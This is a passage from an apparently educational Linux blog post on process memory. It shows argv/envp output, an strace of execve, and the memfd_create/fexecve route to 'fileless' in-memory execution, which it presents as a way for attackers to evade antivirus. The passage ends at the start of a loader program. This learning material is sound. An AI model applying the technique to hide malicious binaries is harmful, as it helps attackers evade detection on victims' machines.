class="p">:</span><span class="o">*.</span><span class="n">ppm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tga</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">tiff</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">png</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">svgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mng</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pcx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mov</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m2v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mkv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">webm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">m4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mp4v</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">vob</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">qt</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">nuv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">wmv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">asf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rmvb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">avi</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">fli</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">dl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xcf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xwd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">yuv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">cgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">emf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">aac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">au</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">flac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">m4a</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mid</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">midi</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mka</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mp3</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mpc</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ogg</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ra</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">wav</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">oga</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">opus</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">spx</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">xspf</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93dc4</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CONNECTION</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">2.15</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93def</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSCLOSE</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e11</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_CLASS</span><span class="o">=</span><span class="n">user</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e28</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">TERM</span><span class="o">=</span><span class="n">tmux</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e3b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSOPEN</span><span class="o">=|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e5b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">USER</span><span class="o">=</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e68</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHLVL</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e70</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_ID</span><span class="o">=</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e81</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_RUNTIME_DIR</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ea0</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CLIENT</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ebd</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_DATA_DIRS</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">desktop</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93efe</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f66</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">DBUS_SESSION_BUS_ADDRESS</span><span class="o">=</span><span class="n">unix</span><span class="p">:</span><span class="n">path</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span><span class="o">/</span><span class="n">bus</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f9c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_TTY</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93faf</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">_</span><span class="o">=./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93fc5</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">OLDPWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span>
</span></span></code></pre></div><p>This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in <strong>continuous memory locations</strong>. To gather more information we can use the <a href="https://www.man7.org/linux/man-pages/man1/strace.1.html"><code>strace</code></a> utility to trace the system calls made by our program.</p>
<p><strong>Command</strong>: <code>strace ./not_hello_world.o  myarg1 myarg2 myarg3  2&gt;strace_output.log  1&gt;program_output.log</code><br>
<em>NOTE:-  2(stderr) redirected to strace_output.log file and 1(stdout) redirected to program_output.log file</em></p>
<p>command : <code>cat strace_output.log</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;./not_hello_world.o&#34;</span>, <span class="o">[</span><span class="s2">&#34;./not_hello_world.o&#34;</span>, <span class="s2">&#34;myarg1&#34;</span>, <span class="s2">&#34;myarg2&#34;</span>, <span class="s2">&#34;myarg3&#34;</span><span class="o">]</span>, 0x7ffe0dbf2cf8 /* <span class="m">25</span> vars */<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x5593be003000
</span></span><span class="line"><span class="cl">arch_prctl<span class="o">(</span>0x3001 /* ARCH_??? */, 0x7ffea24b4bc0<span class="o">)</span> <span class="o">=</span> -1 EINVAL <span class="o">(</span>Invalid argument<span class="o">)</span>
</span></span><span class="line"><span class="cl">access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.preload&#34;</span>, R_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>28934, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 28934, PROT_READ, MAP_PRIVATE, 3, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a640000
</span></span><span class="line"><span class="cl">close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl">read<span class="o">(</span>3, <span class="s2">&#34;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\360q\2\0\0\0\0\0&#34;</span>..., 832<span class="o">)</span> <span class="o">=</span> <span class="m">832</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class="o">)</span> <span class="o">=</span> <span class="m">784</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class="o">)</span> <span class="o">=</span> <span class="m">32</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class="o">)</span> <span class="o">=</span> <span class="m">68</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0755, <span class="nv">st_size</span><span class="o">=</span>2029224, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 8192, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a63e000
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class="o">)</span> <span class="o">=</span> <span class="m">784</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class="o">)</span> <span class="o">=</span> <span class="m">32</span>
</span></span><span class="line"><span class="cl">pread64<span class="o">(</span>3, <span class="s2">&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class="o">)</span> <span class="o">=</span> <span class="m">68</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>NULL, 2036952, PROT_READ, MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE, 3, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a44c000
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a471000, 1847296, PROT_NONE<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a471000, 1540096, PROT_READ<span class="p">|</span>PROT_EXEC, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x25000<span class="o">)</span> <span class="o">=</span> 0x7ff99a471000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a5e9000, 303104, PROT_READ, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x19d000<span class="o">)</span> <span class="o">=</span> 0x7ff99a5e9000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a634000, 24576, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, 3, 0x1e7000<span class="o">)</span> <span class="o">=</span> 0x7ff99a634000
</span></span><span class="line"><span class="cl">mmap<span class="o">(</span>0x7ff99a63a000, 13528, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0x7ff99a63a000
</span></span><span class="line"><span class="cl">close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">arch_prctl<span class="o">(</span>ARCH_SET_FS, 0x7ff99a63f540<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a634000, 12288, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x5593bdded000, 4096, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">mprotect<span class="o">(</span>0x7ff99a675000, 4096, PROT_READ<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">munmap<span class="o">(</span>0x7ff99a640000, 28934<span class="o">)</span>           <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>0, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x5593be003000
</span></span><span class="line"><span class="cl">brk<span class="o">(</span>0x5593be024000<span class="o">)</span>                     <span class="o">=</span> 0x5593be024000
</span></span><span class="line"><span class="cl">write<span class="o">(</span>1, <span class="s2">&#34;Argument count :  4\nArguments li&#34;</span>..., 3244<span class="o">)</span> <span class="o">=</span> <span class="m">3244</span>
</span></span><span class="line"><span class="cl">exit_group<span class="o">(</span>0<span class="o">)</span>                           <span class="o">=</span> ?
</span></span><span class="line"><span class="cl">+++ exited with <span class="m">0</span> +++
</span></span></code></pre></div><p>At first it looks confusing and very difficult to understand, but is very simple and straight forward once you have understood the format of this output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Format of the strace output.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">syscall(arg1, arg2, arg3, ... )  = Return value
</span></span></code></pre></div><p>Now if we look at line-1 of the <code>strace_output.log</code> file, with the newly gained insight. It is very clear that we are calling <code>execve</code> syscall and passing arguments to it.</p>
<p>According to <a href="https://www.man7.org/linux/man-pages/man2/execve.2.html"><code>man 2 execve</code></a> &ndash;&gt; <em><strong>execve()</strong> executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</em></p>
<p>This concludes that the execve() syscall is actually responsible to load the executable ELF file into memory!!
Interestingly, our binary reads (gathers) all the data to be printed from multiple locations and then print it at once at end with a single <code>write()</code> syscall. The return value for write() denotes the number of bytes the syscall wrote. This is the exact amount of chars that was supposed to be written out on stdout but we redirected it to a file. Now we can check if the byte counts are same or not.</p>
<p>We can check if the byte counts in the file match the byte count returned by write() syscall, using &ndash;&gt; <code>wc -c program_output.log</code></p>
<p>output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3244 program_output.log
</span></span></code></pre></div><p>With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">      <span class="n">C</span> <span class="n">program</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">Compiles</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="n">ELF</span> <span class="n">binary</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">execve</span>
</span></span><span class="line"><span class="cl">         <span class="err">│</span>
</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">loaded</span> <span class="ow">in</span> <span class="n">memory</span>
</span></span></code></pre></div><h3 id="idea-of-file-less">Idea of file-less?</h3>
<p>In usual scenarios, we have a compiled malicious binary stored on the victim&rsquo;s machine, that&rsquo;s then executed somehow for the malicious purpose of the attacker. Here we have multiple simpler methods and tools to analyze the binary and know what it is going to do. Most of the times, our antivirus can scan system&rsquo;s harddisk and know if there is a malware or a not.</p>
<p>And we all trust our anti-virus for that!! 😜</p>
<p><img loading="lazy" src="https://media.giphy.com/media/scujCg6C3AaFq/giphy.gif" alt=""  />
</p>
<p>But what if an attacker somehow loaded the ELF file directly into the memory, without writing it to harddisk (not even a temp file). In linux, one of the way to do that is via <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><code>memfd_create()</code></a> syscall. This creates an &ldquo;<code>anonymous file</code>&rdquo; and returns a &ldquo;<code>file descriptor</code>&rdquo; to it.</p>
<p>OK! This had me with the first line of the man page - <code>man 2 memfd_create</code>. But there is more to it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">memfd_create() creates an anonymous file and returns a file
</span></span><span class="line"><span class="cl">descriptor that refers to it.  The file behaves like a regular
</span></span><span class="line"><span class="cl">file, and so can be modified, truncated, memory-mapped, and so
</span></span><span class="line"><span class="cl">on.  However, unlike a regular file, it lives in RAM and has a
</span></span><span class="line"><span class="cl">volatile backing storage.  Once all references to the file are
</span></span><span class="line"><span class="cl">dropped, it is automatically released.  Anonymous memory is used
</span></span><span class="line"><span class="cl">for all backing pages of the file.  Therefore, files created by
</span></span><span class="line"><span class="cl">memfd_create() have the same semantics as other anonymous memory
</span></span><span class="line"><span class="cl">allocations such as those allocated using mmap(2) with the
</span></span><span class="line"><span class="cl">MAP_ANONYMOUS flag.
</span></span></code></pre></div><p>We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don&rsquo;t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon <code>fexecve()</code> -  execute program specified via file descriptor.</p>
<p>Now we have both,  a way to <code>create in memory files by memfd_create()</code> and <code>execute it with fexecve()</code>. We just need a program to glue everything together with a neat logic to make things work the way you want it.</p>
<h3 id="first-fileless-program-in-c">First fileless program in C</h3>
<p>I&rsquo;ve written a simple C program (<code>loader.c</code>) that creates an in-memory file and copies the data of a (local) binary to it. And then executes it. Simple, isn&rsquo;t it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
